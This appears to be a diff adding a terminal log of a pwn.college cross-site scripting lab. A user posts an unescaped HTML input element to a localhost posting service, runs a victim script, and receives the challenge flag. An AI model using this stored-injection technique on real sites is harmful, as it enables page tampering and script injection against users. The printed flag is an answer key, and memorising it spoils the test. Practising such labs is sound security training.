@@ -1,0 +1,36 @@
+hacker@web-security~xss-1:/challenge$ python
+Python 3.12.11 (main, Jun  3 2025, 15:41:47) [GCC 14.2.1 20250322] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import requests
+>>> url = "http://challenge.localhost:80/"
+>>> data = {    "content": '<input type="text" name="hacked" value="hacked_field">'}
+>>> data = {"content": '<input type="text" name="hacked" value="hacked_field">'}
+>>> with requests.Session() as session:
+...     print()
+... 
+KeyboardInterrupt
+>>> requests.Session().post(url, data = data) 
+127.0.0.1 - - [24/Oct/2025 05:55:34] "POST / HTTP/1.1" 302 -
+127.0.0.1 - - [24/Oct/2025 05:55:34] "GET / HTTP/1.1" 200 -
+<Response [200]>
+>>> requests.Session().post(url, data = data).text
+127.0.0.1 - - [24/Oct/2025 05:55:48] "POST / HTTP/1.1" 302 -
+127.0.0.1 - - [24/Oct/2025 05:55:48] "GET / HTTP/1.1" 200 -
+'<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n<hr>First Post!\n<hr><input type="text" name="hacked" value="hacked_field">\n<hr><input type="text" name="hacked" value="hacked_field">\n</body></html>'
+>>> requests.Session().post(url, data = data).text
+127.0.0.1 - - [24/Oct/2025 05:56:24] "POST / HTTP/1.1" 302 -
+127.0.0.1 - - [24/Oct/2025 05:56:24] "GET / HTTP/1.1" 200 -
+'<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n<hr>First Post!\n<hr><input type="text" name="hacked" value="hacked_field">\n<hr><input type="text" name="hacked" value="hacked_field">\n<hr><input type="text" name="hacked" value="hacked_field">\n</body></html>'
+>>> import os
+>>> os.system(./victim)
+  File "<stdin>", line 1
+    os.system(./victim)
+              ^
+SyntaxError: invalid syntax
+>>> os.system("./victim")
+Visiting http://challenge.localhost:80/...
+127.0.0.1 - - [24/Oct/2025 06:00:25] "GET / HTTP/1.1" 200 -
+You got it! Here is your flag:
+pwn.college{U4unHjXdSqq5TJx4aho_wrbRp9F.dVzN1YDL1AjM5MzW}
+0
+>>> 
